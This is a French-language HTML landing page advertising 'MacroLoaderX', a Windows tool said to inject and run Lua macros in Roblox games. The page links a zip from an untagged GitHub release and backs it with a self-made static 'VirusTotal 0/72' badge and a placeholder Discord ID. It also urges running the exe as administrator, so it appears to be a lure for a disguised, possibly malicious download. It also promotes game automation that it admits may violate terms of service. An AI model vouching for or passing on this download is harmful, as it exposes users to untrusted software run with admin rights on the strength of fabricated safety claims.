<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>MacroLoaderX - L'outil macro ultime pour Roblox</title>
  <meta name="description" content="MacroLoaderX : l'outil macro le plus puissant et intuitif pour automatiser vos actions dans Roblox avec des scripts Lua."/>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

    :root {
      --bg: #000000;
      --surface: #111111;
      --text: #ffffff;
      --text-secondary: #aaaaaa;
      --accent: #00ff9d;
      --border: #222222;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      line-height: 1.7;
    }

    header {
      text-align: center;
      padding: 100px 20px 80px;
      max-width: 900px;
      margin: 0 auto;
    }

    .logo {
      width: 180px;
      border-radius: 20px;
      margin-bottom: 30px;
      box-shadow: 0 4px 20px rgba(0, 255, 157, 0.2);
    }

    h1 {
      font-size: 4rem;
      font-weight: 700;
      margin: 0 0 20px;
      letter-spacing: -1px;
    }

    .subtitle {
      font-size: 1.6rem;
      font-weight: 400;
      color: var(--text-secondary);
      max-width: 700px;
      margin: 0 auto 40px;
    }

    .tagline {
      font-size: 1.3rem;
      color: var(--accent);
      font-weight: 500;
    }

    .badges {
      margin: 40px 0;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 12px;
    }

    main {
      max-width: 900px;
      margin: 0 auto;
      padding: 0 20px 100px;
    }

    section {
      margin-bottom: 100px;
    }

    h2 {
      font-size: 2.2rem;
      font-weight: 600;
      margin-bottom: 30px;
      color: var(--text);
    }

    p, ul, ol {
      font-size: 1.15rem;
      color: var(--text-secondary);
    }

    ul, ol {
      padding-left: 24px;
    }

    li {
      margin-bottom: 12px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin: 40px 0;
      background: var(--surface);
      border-radius: 12px;
      overflow: hidden;
    }

    th, td {
      padding: 20px;
      text-align: left;
      border-bottom: 1px solid var(--border);
    }

    th {
      background: #1a1a1a;
      font-weight: 600;
    }

    .screenshots {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
      gap: 40px;
      margin: 50px 0;
    }

    .screenshots img {
      width: 100%;
      border-radius: 16px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.6);
    }

    .screenshot-caption {
      text-align: center;
      margin-top: 12px;
      color: var(--text-secondary);
      font-size: 1rem;
    }

    .download {
      text-align: center;
      padding: 60px 0;
    }

    .download-btn {
      display: inline-block;
      background: var(--accent);
      color: #000;
      font-weight: 600;
      font-size: 1.4rem;
      padding: 18px 50px;
      border-radius: 50px;
      text-decoration: none;
      box-shadow: 0 8px 25px rgba(0, 255, 157, 0.3);
      transition: all 0.3s ease;
    }

    .download-btn:hover {
      transform: translateY(-4px);
      box-shadow: 0 15px 40px rgba(0, 255, 157, 0.4);
    }

    .info {
      background: var(--surface);
      padding: 24px;
      border-radius: 12px;
      margin: 30px 0;
      border-left: 4px solid var(--accent);
      color: var(--text-secondary);
    }

    pre {
      background: var(--surface);
      padding: 24px;
      border-radius: 12px;
      overflow-x: auto;
      font-size: 1rem;
      border: 1px solid var(--border);
    }

    code {
      font-family: 'JetBrains Mono', Consolas, monospace;
    }

    footer {
      text-align: center;
      padding: 60px 20px;
      color: var(--text-secondary);
      font-size: 0.95rem;
      border-top: 1px solid var(--border);
    }

    @media (max-width: 768px) {
      h1 { font-size: 3rem; }
      .subtitle { font-size: 1.4rem; }
      .screenshots { grid-template-columns: 1fr; }
    }
  </style>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap">
</head>
<body>

  <header>
    <img src="https://files.catbox.moe/qz6o4n.jpg" alt="MacroLoaderX Logo" class="logo"/>
    <h1>MacroLoaderX</h1>
    <p class="subtitle">L'outil macro le plus puissant et intuitif pour Roblox en 2026</p>
    <p class="tagline">Automatisation ultra-rapide · Macros Lua personnalisées · Interface fluide</p>

    <div class="badges">
      <img src="https://img.shields.io/github/stars/MacroLoaderX/MacroLoaderX?style=flat-square&logo=github&logoColor=white&color=000000&labelColor=111111" alt="Stars"/>
      <img src="https://img.shields.io/github/forks/MacroLoaderX/MacroLoaderX?style=flat-square&logo=github&logoColor=white&color=000000&labelColor=111111" alt="Forks"/>
      <img src="https://img.shields.io/github/v/release/MacroLoaderX/MacroLoaderX?style=flat-square&color=00ff9d&label=Latest&labelColor=111111" alt="Release"/>
      <img src="https://img.shields.io/discord/123456789012345678?style=flat-square&logo=discord&logoColor=white&color=7289DA&label=Discord&labelColor=111111" alt="Discord"/>
      <img src="https://img.shields.io/badge/VirusTotal-0%2F72-brightgreen?style=flat-square&labelColor=111111" alt="VirusTotal"/>
    </div>
  </header>

  <main>
    <section>
      <h2>Pourquoi MacroLoaderX ?</h2>
      <p>MacroLoaderX est conçu pour <strong>automatiser toutes les tâches répétitives</strong> dans Roblox avec des macros Lua simples, rapides et puissantes.</p>
      <p>Idéal pour répéter des combos, farmer automatiquement, ou créer des routines complexes dans vos jeux préférés comme Blox Fruits, Pet Simulator ou Arsenal.</p>
      <ul>
        <li>Exécution Lua ultra-stable</li>
        <li>Éditeur intégré avec coloration syntaxique</li>
        <li>Bibliothèque communautaire de plus de 500 macros gratuites</li>
        <li>Fonctionne en plein écran ou fenêtré</li>
      </ul>
      <div class="info">
        <strong>Attention :</strong> L’utilisation de macros peut enfreindre les conditions d’utilisation de certains jeux Roblox. Utilisez-les de manière responsable et à vos propres risques.
      </div>
    </section>

    <section>
      <h2>Fonctionnalités</h2>
      <table>
        <tr><th>Fonctionnalité</th><th>Description</th></tr>
        <tr><td>Exécution Lua avancée</td><td>Charge et exécute tout script avec une stabilité maximale</td></tr>
        <tr><td>Interface moderne</td><td>Thème sombre/clair, menu intuitif et fluide</td></tr>
        <tr><td>Éditeur intégré</td><td>Écrivez et testez vos macros directement dans l’outil</td></tr>
        <tr><td>Bibliothèque communautaire</td><td>+500 macros prêtes : auto-farm, anti-AFK, danse, etc.</td></tr>
        <tr><td>Multi-fenêtres</td><td>Compatible plein écran et fenêtré</td></tr>
        <tr><td>Mises à jour automatiques</td><td>Toujours à jour avec les dernières versions Roblox</td></tr>
      </table>
    </section>

    <section>
      <h2>Aperçus</h2>
      <div class="screenshots">
        <div>
          <img src="https://files.catbox.moe/n4ezs7.jpg" alt="Écran principal"/>
          <p class="screenshot-caption">Interface principale</p>
        </div>
        <div>
          <img src="https://files.catbox.moe/in961k.jpg" alt="Macro en action"/>
          <p class="screenshot-caption">Exemple de macro en exécution</p>
        </div>
      </div>
    </section>

    <section class="download">
      <h2>Téléchargement</h2>
      <p><strong>Version actuelle : v2.4.0 — 01/01/2026</strong></p>
      <a href="https://github.com/n0lex9999/MacroLoaderX/releases/download/untagged-e76d7861168038356685/MacroLoaderX.zip" class="download-btn">
        Télécharger MacroLoaderX.zip
      </a>
      <div class="info">
        Taille : 1.38 MB<br>
        Compatible : Windows 10 · Windows 11<br>
        VirusTotal : 0/72 – Propre<br><br>
        <strong>Conseil :</strong> Lancez en administrateur pour une compatibilité optimale.
      </div>
    </section>

    <section>
      <h2>Utilisation rapide</h2>
      <ol>
        <li>Téléchargez et extrayez le fichier</li>
        <li>Lancez <code>MacroLoaderX.exe</code> (administrateur recommandé)</li>
        <li>Ouvrez Roblox et rejoignez un jeu</li>
        <li>Chargez une macro .lua et cliquez sur Démarrer</li>
        <li>Profitez !</li>
      </ol>

      <p>Exemple de macro simple :</p>
      <pre><code>while true do
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(2)
end</code></pre>
    </section>
  </main>

  <footer>
    © 2026 MacroLoaderX • Rejoignez la communauté sur <a href="https://discord.gg/macroloaderx" style="color:var(--accent); text-decoration:none;">Discord</a>
  </footer>
</body>
</html>
